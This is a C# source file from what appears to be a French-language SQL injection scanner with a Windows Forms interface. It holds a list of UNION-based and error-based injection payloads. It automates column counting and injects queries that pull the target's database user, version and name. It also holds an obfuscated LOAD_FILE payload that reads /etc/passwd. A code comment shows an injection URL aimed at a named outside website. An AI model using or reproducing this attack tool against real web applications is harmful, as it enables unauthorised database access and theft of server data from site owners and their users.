using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace SQl_SCanner
{
    class sql_inject
    {
        private MainForm form = GlobalVar.form;
        private string _url_originale;
        private string _url_base;
        private int _nbr_colonne;
        private int _colonne_point;
        private List<string> _param = new List<string> { };
        private const string baseI = "(select 1 from(select count(*),concat((select (select [t]) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)";
        private const string separateur = "!~!";
        private const string s_separateur = "'~!'";
        private const string var_n = "[t]";
        private List<string> _union = new List<string> 
        {
            "999999.9 union all select [t]",
            "999999.9 union all select [t]--",
            "999999.9' union all select [t] and '0'='0",
            "999999.9\" union all select [t] and \"0\"=\"0",
            "999999.9) union all select [t] and (0=0",
            "9' and [t] '1'=1",
            "9' or 1=[t] and '1'=1",
            "999999.9 union all select [t] #",
            "999999.9 union all select [t]-- #",
            "999999.9\" union all select [t] and \"0\"=\"0 #",
            "999999.9' union all select [t] and '0'='0 #",
            "999999.9) union all select [t] and (0=0) #",
        };
        private chaine ch = new chaine();
        private Outils oo = new Outils();

        /*
         * //EXCEPTION
            http://www.eatmybrains.com/showreview.php?id=999999.9 union all select [t],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null


         */
        public void Analyse(string url)
        {
            form.txt_statut_analyse.Invoke((MethodInvoker)(() =>
            {
                form.txt_statut_analyse.Text = "Analyse: " + url + Environment.NewLine;
            }));
            checked
            {
                HttpRequete hr = new HttpRequete();
                sqli_check vrf = new sqli_check();
                sqli_colonne colonne = new sqli_colonne();
                string url_inj_point = string.Empty;
                string inj_point_curr = string.Empty;
                bool point_trv = false;
                _url_originale = url;
                _url_base = url.Split('?')[0];
                _param = ch.analyseParam(url);

                bool[] ok = new bool[2];
                ok[0] = vrf.demmareAnalyseFast(url);
                ok[1] = vrf.demmareAnalyseAvanced(url);
                if (ok[0] || ok[1])
                {
                    int u = 0; //Union Style 1
                    while (!point_trv && u < _union.Count)
                    {
                        _nbr_colonne = colonne.Compter(_param, _url_base, _union[u]);
                        onFait((u + 1).ToString());
                        for (int p = 0; p < _param.Count; p++)
                        {
                            _colonne_point = colonne.FindColonneVise(_url_base + ch.escapeParam(ch.genParamParIndex(_param, 0, p + 1)) + _union[u].Replace("[t]", ch.genNbrColonneVise(_nbr_colonne, _colonne_point)) + ch.genParamParIndex(_param, p + 1, _param.Count), _nbr_colonne);

                            url_inj_point = _url_base + ch.escapeParam(ch.genParamParIndex(_param, 0, p + 1)) + _union[u].Replace("[t]", ch.genNbrColonneVise(_nbr_colonne, _colonne_point)) + ch.genParamParIndex(_param, p + 1, _param.Count);

                            inj_point_curr = url_inj_point.Replace("[t]", ch.Encode("concat(" + ch.getHex(separateur) + ",concat(user()," + ch.getHex(s_separateur) + ",version()," + ch.getHex(s_separateur) + ",database())," + ch.getHex(separateur) + ")"));
                            
                            string page = hr.get(inj_point_curr);
                            if (page.Contains(separateur) || page.Contains(s_separateur))
                            {
                                setResult(page, url_inj_point);
                                point_trv = true;
                                break;
                            }
                        }
                        u++;
                    }
                }
                else
                {
                    form.txt_statut_analyse.Invoke((MethodInvoker)(() =>
                    {
                        form.txt_statut_analyse.Text = "Injection char echouer :( ";
                    }));
                } 
            }
        }

        private void onFait(string u)
        {
            form.txt_statut_analyse.Invoke((MethodInvoker)(() =>
            {
                form.txt_statut_analyse.Text = "Union Style Running: " + u;
            }));
        }
        private void setResult(string page,string url_point)
        {
            string[] info = ch.extSubResult(s_separateur, ch.extResult(separateur, page));
            string ip = oo.avoirip(url_point.Split('/')[2]);
            string loadfile = checkLoadFile(url_point).ToString();

            form.groupInfoAnaluse.Invoke((MethodInvoker)(() =>
            {
                form.label8.Visible = true;
                form.txt_urlPointSucces.Visible = true;
                form.btn_aller_dump.Visible = true;

                form.txt_urlPointSucces.Text = url_point;
                form.txt_LoadFileAnalyse.Text = loadfile;

                form.txt_userAnalyse.Text = info[0];
                form.txt_versionAnalyse.Text = info[1];
                form.txt_ipAnalyse.Text = ip;
            }));
        }
        private bool Page_Bon(string page)
        {
            if(page.Contains(separateur) || page.Contains(s_separateur))
            {
                return true;
            }
            else { return false; }
        }

        internal string[] getInfos(string url_point)
        {
            HttpRequete hr = new HttpRequete();
            string url_g = url_point.Replace(var_n, "concat(" + ch.getHex(separateur) + ",concat(user()," + ch.getHex(s_separateur) + ",version()," + ch.getHex(s_separateur) + ",database())," + ch.getHex(separateur) + ")");
            string page = hr.get(url_g);
            if (page.Contains(separateur))
            {
                string[] rslt = ch.extSubResult(s_separateur, ch.extResult(separateur, page));
                return rslt;
            }
            string[] vide = {"","","",""};
            return vide;
        }

        internal bool checkLoadFile(string url_point, string fichier = "/etc/passwd")
        {
            HttpRequete hr = new HttpRequete();
            Outils oo = new Outils();
            string url_g = url_point.Replace(var_n, "cOnVeRt(/**/cOnCaT(" + ch.getHex(separateur) + "/**/hEx(/**/lOaD_FiLe(" +  ch.getHex(fichier) + "))," + ch.getHex(separateur) + ") using utf8)");
            string page = hr.get(url_g);
            if (page.Contains(separateur))
            {
                string result = ch.extResult(separateur, page);
                if (result != "")
                { 
                    return true;
                }
                else
                {
                    return false;
                }
            }
            return false;
        }

    }
}
